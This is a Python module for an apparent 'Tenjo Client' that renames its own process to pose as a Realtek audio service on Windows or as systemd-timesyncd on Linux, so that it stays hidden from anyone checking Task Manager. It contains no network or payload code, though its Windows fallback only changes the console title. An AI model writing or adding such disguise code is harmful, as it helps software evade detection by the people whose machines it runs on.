"""
Process Disguise Module for Tenjo Client
Changes python.exe process name in Task Manager to appear as legitimate Windows service.
"""

import os
import sys

def change_process_name(new_name: str = "RtkAudioService64"):
    """
    Change process name visible in Task Manager
    
    Args:
        new_name: New process name (default: RtkAudioService64 to mimic Realtek Audio Service)
    
    Returns:
        bool: True if successful, False otherwise
    """
    try:
        # Try using setproctitle (needs to be installed)
        import setproctitle
        setproctitle.setproctitle(new_name)
        return True
    except ImportError:
        # setproctitle not available, try ctypes method (Windows only)
        if os.name == 'nt':
            try:
                import ctypes
                
                # Get kernel32
                kernel32 = ctypes.windll.kernel32
                
                # Change console title (affects process name in some views)
                kernel32.SetConsoleTitleW(new_name)
                
                return True
            except Exception as e:
                print(f"[WARNING] Could not change process name: {e}")
                return False
        else:
            # On Linux/Mac, try prctl
            try:
                import ctypes
                import ctypes.util
                
                libc = ctypes.CDLL(ctypes.util.find_library('c'))
                PR_SET_NAME = 15
                
                libc.prctl(PR_SET_NAME, new_name.encode('utf-8'), 0, 0, 0)
                return True
            except Exception as e:
                print(f"[WARNING] Could not change process name: {e}")
                return False

def get_disguise_name() -> str:
    """
    Get appropriate disguise name based on OS
    
    Returns:
        str: Process name to use
    """
    if os.name == 'nt':
        # Windows: Mimic Realtek Audio Service
        return "RtkAudioService64"
    else:
        # Linux/Mac: Generic system service
        return "systemd-timesyncd"

def apply_disguise():
    """
    Apply process disguise with appropriate name
    
    Returns:
        bool: True if successful, False otherwise
    """
    disguise_name = get_disguise_name()
    success = change_process_name(disguise_name)
    
    if success:
        print(f"[OK] Process disguised as: {disguise_name}")
    else:
        print(f"[WARNING] Process disguise failed, continuing as python.exe")
    
    return success

if __name__ == "__main__":
    # Test process disguise
    import time
    
    print("Testing process disguise...")
    print(f"Current process: python.exe")
    print(f"Target name: {get_disguise_name()}")
    print("")
    
    success = apply_disguise()
    
    if success:
        print("")
        print("✓ Process name changed!")
        print("Check Task Manager to verify")
        print("")
        print("Process will keep this name for 10 seconds...")
        time.sleep(10)
        print("Test complete!")
    else:
        print("")
        print("✗ Process disguise not available")
        print("")
        print("To enable process disguise, install:")
        print("  pip install setproctitle")
